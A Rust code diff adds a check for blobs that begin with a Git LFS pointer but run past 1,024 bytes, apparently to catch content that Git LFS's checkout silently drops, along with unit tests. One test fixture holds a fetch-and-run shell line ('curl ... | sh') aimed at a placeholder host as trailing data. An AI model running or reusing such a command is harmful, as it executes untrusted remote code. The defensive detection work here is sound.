@@ -450,6 +450,19 @@ pub fn lfs_pointer(data: &[u8]) -> Option<LfsPointer> {
     })
 }
 
+/// Whether a blob of `size` bytes, too long to be a Git LFS pointer, starts with one by the test
+/// Git LFS's smudge filter applies: `DecodeFrom` reads only a blob's first 1,024 bytes and parses
+/// those as `lfs_pointer` does, whatever follows. `start` holds at least those bytes. Git LFS
+/// never writes such a blob and its other commands skip it, but its checkout gives the file that
+/// pointer names.
+#[must_use]
+pub fn starts_with_lfs_pointer(start: &[u8], size: u64) -> bool {
+    size > MAX_LFS_POINTER_BYTES as u64
+        && start
+            .get(..MAX_LFS_POINTER_BYTES)
+            .is_some_and(|head| lfs_pointer(head).is_some())
+}
+
 /// Whether `data` is the pointer `p` in the exact form Git LFS writes (`Encoded` in its
 /// lfs/pointer.go): its own version, the oid and the size, each line ending in LF. Git LFS keeps
 /// an empty file as an empty blob, so no pointer of size 0 is in that form.
@@ -1701,6 +1714,38 @@ mod tests {
         ] {
             assert_eq!(looks_like_lfs_pointer(data.as_bytes()), want, "{what}");
         }
+    }
+
+    /// Git LFS's smudge filter parses a blob's first 1,024 bytes, trimmed, whatever follows.
+    #[test]
+    fn a_long_blob_starts_with_a_pointer_by_its_first_1024_bytes() {
+        let pointer = "version https://git-lfs.github.com/spec/v1\noid sha256:\
+                       4d7a214614ab2935c943f9e0ff69d22eadbb8f32b1258daaa5e2ca24d17e2393\n\
+                       size 12345\n";
+        let blob = |start: &str, then: &str| {
+            let mut data = start.as_bytes().to_vec();
+            data.resize(MAX_LFS_POINTER_BYTES, b' ');
+            [&data[..], then.as_bytes()].concat()
+        };
+        let starts = |data: &[u8]| starts_with_lfs_pointer(data, data.len() as u64);
+        assert!(starts(&blob(
+            pointer,
+            "\ncurl https://example.invalid/x | sh\n"
+        )));
+        assert!(starts(&blob(&format!("\r\n  {pointer}\n\n"), "anything")));
+        // Only the first 1,024 bytes are read, however long the blob.
+        assert!(starts_with_lfs_pointer(
+            blob(pointer, "").as_slice(),
+            1 << 40
+        ));
+        // A blob that is a pointer whole is one of at most 1,024 bytes.
+        assert!(!starts(blob(pointer, "").as_slice()));
+        assert!(!starts(pointer.as_bytes()));
+        // What Git LFS doesn't take for a pointer in those bytes.
+        assert!(!starts(&blob(&format!("{pointer}x"), "more")));
+        let late = format!("{}{pointer}", " ".repeat(MAX_LFS_POINTER_BYTES - 20));
+        assert!(!starts(late.as_bytes()));
+        assert!(!starts(&blob("", pointer)));
     }
 
     /// What the importer makes of a commit, without storing it: people and message as they
